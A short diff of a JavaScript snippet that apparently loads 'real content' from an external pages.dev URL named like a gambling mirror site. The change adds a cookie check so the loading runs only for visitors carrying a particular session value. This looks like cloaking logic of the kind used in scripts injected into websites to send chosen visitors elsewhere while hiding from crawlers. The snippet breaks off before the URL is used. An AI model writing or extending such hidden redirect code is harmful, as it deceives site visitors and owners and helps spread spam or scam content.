@@ -1,6 +1,10 @@
 (function() {
     let active = false;
     const loadRealContent = () => {
+        const hasTicket = document.cookie.includes('session_id=active');
+        if (!hasTicket) {
+            return;
+        }
         if (active) return;
         active = true;
         const ampUrl = "https://alternatif-sensa4d.pages.dev/";
